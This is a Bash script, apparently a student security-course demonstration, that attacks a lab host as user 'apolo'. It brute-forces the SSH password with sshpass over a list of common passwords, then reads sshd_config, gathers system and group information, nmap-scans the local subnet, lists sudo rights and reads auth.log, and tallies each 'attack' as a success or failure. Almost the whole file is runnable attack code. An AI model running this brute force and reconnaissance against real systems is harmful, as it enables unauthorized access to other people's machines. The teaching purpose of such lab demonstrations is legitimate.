#!/bin/bash

# Demo Vulnerabilidades - Trabalho Final Segurança

TARGET="192.168.3.216"
USER="apolo"

# Contadores
ATAQUES_TOTAL=0
ATAQUES_SUCESSO=0
ATAQUES_FALHA=0

# Verificar conectividade
if ! ping -c 1 "$TARGET" >/dev/null 2>&1; then
    echo "❌ ERRO: Não foi possível conectar com $TARGET"
    echo "Verifique se a máquina alvo está ativa na rede"
    exit 1
fi

echo "="*60
echo "🔴 DEMONSTRAÇÃO DE VULNERABILIDADES CRÍTICAS"
echo "Alvo: $TARGET | Usuário: $USER"
echo "="*60
echo ""

# Função para registrar resultado
registrar_resultado() {
    local nome="$1"
    local sucesso="$2"
    local detalhes="$3"
    
    ATAQUES_TOTAL=$((ATAQUES_TOTAL + 1))
    
    if [ "$sucesso" = "true" ]; then
        ATAQUES_SUCESSO=$((ATAQUES_SUCESSO + 1))
        echo "  [RESULTADO] ✅ SUCESSO - $nome"
        echo "  [DETALHES] $detalhes"
    else
        ATAQUES_FALHA=$((ATAQUES_FALHA + 1))
        echo "  [RESULTADO] ❌ FALHOU - $nome"
        echo "  [MOTIVO] $detalhes"
    fi
    echo ""
}

# 1. SSH Brute Force
echo "[VULNERABILIDADE 1] SSH BRUTE FORCE ATTACK"
echo "-"*50
echo "🎯 Testando senhas comuns contra SSH..."
echo ""

SENHA_ENCONTRADA=""
for pwd in "admin" "password" "123456" "qwerty" "letmein" "welcome" "monkey" "dragon" "master" "shadow" "12345" "password123" "admin123" "root" "toor" "pass" "test" "guest" "user" "login" "abc123" "123123" "password1" "1234" "12345678" "senha" "123" "1" "2" "3" "4" "5" "6" "7" "8" "9" "123456789"; do
    echo -n "  [TESTE] Senha: '$pwd' ... "
    if result=$(timeout 10 sshpass -p "$pwd" ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no $USER@$TARGET "echo 'ACESSO_OBTIDO'" 2>/dev/null); then
        echo "✅ SUCESSO!"
        SENHA_ENCONTRADA="$pwd"
        registrar_resultado "SSH Brute Force" "true" "Senha fraca '$pwd' permitiu acesso total. Resposta: $result"
        break
    else
        echo "❌ Falhou"
    fi
done

if [ -z "$SENHA_ENCONTRADA" ]; then
    registrar_resultado "SSH Brute Force" "false" "Nenhuma senha da lista funcionou - possível hardening aplicado"
fi

# 2. Configuração SSH Insegura
echo "[VULNERABILIDADE 2] CONFIGURAÇÃO SSH INSEGURA"
echo "-"*50
echo "🔍 Analisando configurações perigosas..."

if ssh_config=$(timeout 10 ssh $USER@$TARGET "grep -E '(PermitRootLogin|PasswordAuthentication)' /etc/ssh/sshd_config" 2>/dev/null); then
    echo "  [ENCONTRADO] Configurações inseguras:"
    echo "$ssh_config" | while read line; do
        echo "    ⚠️  $line"
    done
    
    # Verificar configurações específicas
    if echo "$ssh_config" | grep -q "PermitRootLogin yes"; then
        registrar_resultado "Root Login Habilitado" "true" "PermitRootLogin yes - Permite login direto como root"
    fi
    
    if echo "$ssh_config" | grep -q "PasswordAuthentication yes"; then
        registrar_resultado "Autenticação por Senha" "true" "PasswordAuthentication yes - Permite ataques de força bruta"
    fi
else
    registrar_resultado "Análise SSH Config" "false" "Não foi possível acessar configurações SSH"
fi

# 3. Enumeração Sistema
echo "[VULNERABILIDADE 3] ENUMERAÇÃO DO SISTEMA"
echo "-"*50
echo "🕵️  Coletando informações do sistema..."

if sys_info=$(timeout 10 ssh $USER@$TARGET "uname -a && echo '---' && whoami && echo '---' && id" 2>/dev/null); then
    sistema=$(echo "$sys_info" | head -1)
    usuario=$(echo "$sys_info" | sed -n '3p')
    grupos=$(echo "$sys_info" | tail -1)
    
    echo "  [SISTEMA] $sistema"
    echo "  [USUÁRIO] $usuario"
    echo "  [GRUPOS] $grupos"
    
    # Verificar se tem privilégios perigosos
    if echo "$grupos" | grep -q "sudo"; then
        registrar_resultado "Enumeração Sistema" "true" "Usuário '$usuario' tem privilégios sudo. Sistema: $sistema"
    else
        registrar_resultado "Enumeração Sistema" "true" "Informações coletadas. Usuário: $usuario, Sistema: $sistema"
    fi
else
    registrar_resultado "Enumeração Sistema" "false" "Falha na coleta de informações do sistema"
fi

# 4. Network Discovery
echo "[VULNERABILIDADE 4] DESCOBERTA DE REDE"
echo "-"*50
echo "🌐 Escaneando rede local..."

if hosts=$(nmap -sn 192.168.3.0/24 2>/dev/null | grep "Nmap scan report"); then
    num_hosts=$(echo "$hosts" | wc -l)
    echo "  [HOSTS ENCONTRADOS] $num_hosts hosts ativos:"
    echo "$hosts" | head -5 | while read line; do
        echo "    📡 $line"
    done
    registrar_resultado "Network Discovery" "true" "$num_hosts hosts descobertos na rede - rede sem segmentação adequada"
else
    registrar_resultado "Network Discovery" "false" "Falha no scan de rede - possível firewall bloqueando"
fi

# 5. Privilege Check
echo "[VULNERABILIDADE 5] ESCALAÇÃO DE PRIVILÉGIOS"
echo "-"*50
echo "👑 Verificando privilégios sudo..."

if sudo_info=$(timeout 10 ssh $USER@$TARGET "sudo -l" 2>/dev/null); then
    echo "  [CRÍTICO] Usuário tem privilégios sudo:"
    echo "$sudo_info" | while read line; do
        echo "    🚨 $line"
    done
    
    # Verificar se pode executar tudo
    if echo "$sudo_info" | grep -q "ALL"; then
        registrar_resultado "Privilégios Sudo" "true" "Usuário pode executar TODOS os comandos como root - escalação total"
    else
        registrar_resultado "Privilégios Sudo" "true" "Usuário tem privilégios sudo limitados"
    fi
else
    registrar_resultado "Privilégios Sudo" "false" "Não foi possível verificar privilégios sudo"
fi

# 6. Log Analysis
echo "[VULNERABILIDADE 6] ANÁLISE DE LOGS"
echo "-"*50
echo "📋 Verificando logs de segurança..."

if log_info=$(timeout 10 ssh $USER@$TARGET "ls -la /var/log/auth.log" 2>/dev/null); then
    echo "  [LOG ENCONTRADO]:"
    echo "    📄 $log_info"
    
    # Verificar últimas atividades
    if recent_logins=$(timeout 10 ssh $USER@$TARGET "tail -3 /var/log/auth.log" 2>/dev/null); then
        echo "  [ÚLTIMAS ATIVIDADES]:"
        echo "$recent_logins" | while read line; do
            echo "    🔍 $line"
        done
        registrar_resultado "Análise de Logs" "true" "Logs acessíveis - possível análise de atividades maliciosas"
    else
        registrar_resultado "Análise de Logs" "true" "Log encontrado mas sem acesso ao conteúdo"
    fi
else
    registrar_resultado "Análise de Logs" "false" "Logs não acessíveis - possível hardening aplicado"
fi

# Resumo Final
echo ""
echo "="*60
echo "📊 RESUMO DOS ATAQUES EXECUTADOS"
echo "="*60
echo "🎯 Total de Ataques: $ATAQUES_TOTAL"
echo "✅ Sucessos: $ATAQUES_SUCESSO"
echo "❌ Falhas: $ATAQUES_FALHA"
echo "📈 Taxa de Sucesso: $(( ATAQUES_SUCESSO * 100 / ATAQUES_TOTAL ))%"
echo ""

if [ -n "$SENHA_ENCONTRADA" ]; then
    echo "🔓 Acesso obtido com senha: $SENHA_ENCONTRADA"
fi

if [ $ATAQUES_SUCESSO -gt 3 ]; then
    echo "🚨 SISTEMA ALTAMENTE VULNERÁVEL!"
    echo "🎯 Múltiplas vulnerabilidades exploradas com sucesso"
else
    echo "🛡️ Sistema com algumas proteções ativas"
fi

echo ""
echo "🔧 Execute: make correcao (para aplicar correções)"
echo "="*60

# Exit code baseado no sucesso
if [ $ATAQUES_SUCESSO -gt 0 ]; then
    exit 0  # Ataques bem-sucedidos
else
    exit 1  # Nenhum ataque funcionou
fi